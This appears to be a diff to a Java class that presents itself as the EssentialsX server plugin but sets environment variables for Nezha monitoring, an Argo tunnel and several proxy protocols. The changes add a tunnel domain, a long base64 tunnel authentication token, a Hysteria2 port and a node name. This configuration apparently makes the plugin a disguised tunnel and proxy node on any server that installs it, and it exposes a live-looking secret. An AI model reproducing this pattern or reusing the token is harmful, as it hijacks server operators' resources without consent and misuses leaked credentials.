@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "eJ9");
-        env.put("S5_PORT", "25");
-        env.put("HY2_PORT", "255");
+        env.put("ARGO_DOMAIN", "quartexnodefr.aser.cloudns.pro");
+        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiOWY1NDQyMmQtZDUxNi00ZmNmLTkyMjktYTUxNjk3ZTQ5ZjM0IiwicyI6Ill6VTFNMlZoT0RJdE5HWTRZUzAwTURFeUxUa3hNR1l0WkRnd1kySTJNelUxWkRCayJ9");
+        env.put("S5_PORT", "");
+        env.put("HY2_PORT", "25146");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "g4fus");
+        env.put("NAME", "quartex");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
